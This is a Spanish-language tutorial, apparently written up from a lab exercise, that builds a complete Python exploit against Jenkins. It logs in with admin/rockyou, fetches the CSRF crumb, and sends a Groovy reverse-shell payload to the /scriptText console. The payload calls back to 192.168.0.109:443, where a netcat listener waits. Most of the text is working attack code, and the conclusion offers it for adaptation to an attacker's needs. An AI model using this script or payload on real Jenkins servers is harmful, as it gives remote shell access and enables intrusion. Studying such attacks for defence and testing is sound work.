
## 1. Preparación del Entorno y Consideraciones Iniciales

Antes de comenzar con el código, es fundamental tener en cuenta lo siguiente:

- **Herramientas utilizadas:**  
    Se usa Python junto con la librería [**requests**](https://docs.python-requests.org/en/latest/) para interactuar con Jenkins vía HTTP.
    
- **Contexto:**  
    Se tiene una instancia de Jenkins corriendo en una máquina víctima (en este ejemplo, se accede mediante la IP `172.17.0.2` en el puerto `8080`).
    
- **Objetivo:**  
    El propósito es ejecutar un payload malicioso (una reverse shell) a través de la consola de scripts de Jenkins, aprovechando la ejecución de código Groovy.
    
- **Seguridad:**  
    Se utiliza el mecanismo de **crumb** que Jenkins implementa para prevenir ataques CSRF. Este token es necesario para enviar peticiones POST válidas a Jenkins.
    

---

## 2. Importación de la Librería y Definición de Variables Básicas

El primer paso es importar la librería `requests` que se encargará de las peticiones HTTP:

```python
import requests
```

Luego se definen variables esenciales para la conexión a Jenkins:

- **jenkins_url:** La URL base de Jenkins, que incluye la dirección IP y el puerto:
    
    ```python
    jenkins_url = 'http://172.17.0.2:8080'
    ```
    
- **usuario y password:** Las credenciales necesarias para autenticarse en Jenkins:
    
    ```python
    usuario = 'admin'
    password = 'rockyou'
    ```
    

---

## 3. Definición del Payload Groovy

Se crea una variable llamada `groovy_payload` en la que se define un bloque de código Groovy. Este código se utiliza para ejecutar una reverse shell. En el ejemplo se define de la siguiente forma:

```python
groovy_payload = """ 
String host="192.168.0.109";
int port=443;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)
        so.write(pi.read());
    while(pe.available()>0)
        so.write(pe.read());
    while(si.available()>0)
        po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    } catch (Exception e){}
};
p.destroy();
s.close(); 
"""
```

**Aspectos a notar:**

- Se utiliza la sintaxis de triple comillas para definir un string multilínea.
    
- El payload abre un socket hacia el host y puerto definidos (`192.168.0.109` y `443` respectivamente) y ejecuta el comando `bash` para obtener una shell interactiva.
    
- Se redireccionan los flujos de entrada y salida para enviar la información entre el proceso local y la conexión remota.
    

---

## 4. Creación de una Sesión y Configuración de Autenticación

Se crea una sesión con la librería `requests` que permite mantener cookies y datos de autenticación entre peticiones:

```python
session = requests.session()
session.auth = (usuario, password)
```

Esto configura la autenticación básica (usuario y contraseña) para cada petición realizada con dicha sesión.

---

## 5. Obtención del Jenkins Crumb

Jenkins utiliza un token denominado **crumb** para prevenir ataques CSRF. Para obtener este token se realiza una petición GET a la siguiente URL:

```python
crumb_url = f'{jenkins_url}/crumbIssuer/api/json'
crumb_respuesta = session.get(crumb_url)
print(crumb_respuesta)
```

**Detalles:**

- Se construye la URL del endpoint del crumb usando una _f-string_ para concatenar la URL base.
    
- La respuesta obtenida debe tener un código de estado 200 (lo que indica éxito).
    

---

## 6. Comprobación del Estado de la Respuesta y Extracción del Crumb

Es fundamental verificar que la petición para obtener el crumb se realizó correctamente:

```python
if crumb_respuesta.status_code != 200:
    print(f"Error al obtener el crumb: {crumb_respuesta.status_code}")
    exit()
```

- Se comprueba el `status_code`. Si no es 200, se imprime un mensaje de error y se finaliza el script usando `exit()`.
    
- En caso de éxito, se extrae el contenido JSON de la respuesta para obtener el valor del crumb:
    

```python
crumb_data_total = crumb_respuesta.json()
print(crumb_data_total)
crumb = crumb_data_total['crumb']
```

Aquí, `crumb_data_total` es un diccionario que contiene la clave `'crumb'` y se extrae para su uso en la siguiente petición.

---

## 7. Definición de la URL para Ejecutar el Script (Script Console)

Jenkins expone un endpoint para ejecutar scripts Groovy a través de su consola de scripts. La URL se define de la siguiente manera:

```python
script_url = f'{jenkins_url}/scriptText'
```

- Se utiliza la misma técnica de _f-string_ para construir la URL a partir de la base de Jenkins.
    
- Este endpoint (`/scriptText`) es el que se utiliza para enviar y ejecutar el payload.
    

---

## 8. Configuración de las Cabeceras (Headers) y la Data de la Petición

Para enviar el payload a Jenkins, se preparan dos diccionarios:

1. **Headers:**  
    Este diccionario incluye:
    
    - El tipo de contenido, que es `application/x-www-form-urlencoded` (necesario para peticiones POST que envían datos en formato clave-valor).
        
    - El token `Jenkins-Crumb` que se obtuvo en el paso anterior.
        
    
    ```python
    headers = {
        'content-Type': 'application/x-www-form-urlencoded',
        'Jenkins-Crumb': crumb
    }
    ```
    
2. **Data:**  
    Aquí se define el parámetro `script` que contendrá el payload Groovy:
    
    ```python
    data = {
        'script': groovy_payload
    }
    ```
    

---

## 9. Envío de la Petición POST para Ejecutar el Payload

Se utiliza el método `post` de la sesión de `requests` para enviar la petición al endpoint del script:

```python
try:
    respuesta = session.post(script_url, headers=headers, data=data)
    
    if respuesta.status_code == 200:
        print("Script ejecutado con éxito")
    else:
        print(f"Error al ejecutar la reverse shell: {respuesta.status_code}")
        print(respuesta.text)
except:
    print("Error al enviar la solicitud al servidor")
```

**Puntos clave:**

- **Bloque try/except:**  
    Se usa para capturar posibles excepciones en el envío de la petición, por ejemplo, si el servidor no está disponible.
    
- **Verificación del código de estado:**
    
    - Si `status_code` es 200, se asume que la petición fue exitosa y se imprime un mensaje de éxito.
        
    - Si no es 200, se imprime el código de error y, opcionalmente, el contenido de la respuesta para mayor información.
        

---

## 10. Establecimiento de la Conexión Reversa con Netcat

Paralelamente, se utiliza **netcat** para escuchar en el puerto definido en el payload (en este ejemplo, el puerto `443`):

```bash
sudo nc -nlvp 443
```

- **sudo:** Se requiere permisos de administrador para abrir puertos privilegiados o para ejecutar netcat de esta manera.
    
- **nc -nlvp 443:**
    
    - `-n`: No resolver nombres.
        
    - `-l`: Escuchar en modo server.
        
    - `-v`: Verbosidad (muestra información detallada).
        
    - `-p 443`: Define el puerto de escucha (443 en este caso).
        

Cuando el script de Jenkins se ejecute, el payload Groovy abrirá una conexión hacia la IP definida (`192.168.0.109`) en el puerto `443`, lo que permitirá obtener una shell inversa (reverse shell). En el ejemplo se muestra que la conexión se establece, se reciben comandos y se puede interactuar con el sistema víctima.

---

## 11. Ejecución y Verificación de la Explotación

Una vez ejecutado el script en Python:

- Se imprime el resultado de la petición para obtener el crumb y se verifica que la autenticación se haya realizado correctamente.
    
- El script POST se envía a Jenkins, lo que provoca que se ejecute el código Groovy.
    
- Si la reverse shell se establece, se recibe una conexión en la sesión de netcat.
    
- Dentro de la shell, se pueden ejecutar comandos como `whoami`, `ls` o `uname -a`, comprobando que se ha obtenido acceso al sistema (en el ejemplo, se observa que el usuario es `jenkins` y se listan archivos de configuración de Jenkins).
    

El flujo completo se resume en:

1. **Preparar el entorno y definir variables.**
    
2. **Crear el payload Groovy para la reverse shell.**
    
3. **Autenticarse en Jenkins mediante requests.**
    
4. **Obtener el token de seguridad (crumb).**
    
5. **Construir la URL y preparar la petición POST.**
    
6. **Enviar la petición y ejecutar el payload.**
    
7. **Establecer una sesión de escucha con netcat para recibir la shell.**
    
8. **Verificar el acceso al sistema mediante comandos interactivos.**
    

---

## 12. Posibles Mejoras y Extensiones

El autor del ejemplo menciona algunas ideas para mejorar y hacer el código más robusto:

- **Uso de ARParse:**  
    Se sugiere utilizar la librería `argparse` para permitir que el script reciba parámetros como usuario, contraseña, IP y puerto de Jenkins desde la línea de comandos. Esto haría el script más flexible y reutilizable.
    
- **Parámetros Dinámicos:**  
    Al usar `argparse`, el script podría adaptarse a diferentes entornos sin necesidad de modificar el código internamente, simplemente pasando argumentos al ejecutar el script:
    
    ```bash
    python3 exploit.py --usuario admin --password rockyou --ip 172.17.0.2 --puerto 8080
    ```
    
- **Manejo de Errores Más Detallado:**  
    Se puede ampliar la captura de excepciones y la verificación de errores para detectar problemas tanto en la conexión como en la ejecución del payload.
    

---

## Conclusión

Se ha desarrollado un script en Python que automatiza la explotación de una instancia de Jenkins mediante la ejecución remota de código Groovy.

- Se inicia autenticándose en Jenkins y obteniendo el token de seguridad (crumb).
    
- Se define y envía un payload Groovy que abre una reverse shell.
    
- Finalmente, se establece una conexión inversa a través de netcat, permitiendo la ejecución remota de comandos en el sistema víctima.
    

Cada paso se implementa cuidadosamente para garantizar que:

- Se maneje la autenticación.
    
- Se respete el mecanismo de seguridad de Jenkins.
    
- Se envíe el payload de manera correcta y se verifique la ejecución exitosa.
    

Esta metodología es un ejemplo clásico de cómo se puede interactuar con un servicio web vulnerable (en este caso, Jenkins) utilizando Python para automatizar tareas de ciberseguridad, y puede ampliarse o modificarse según las necesidades del atacante o del auditor de seguridad.
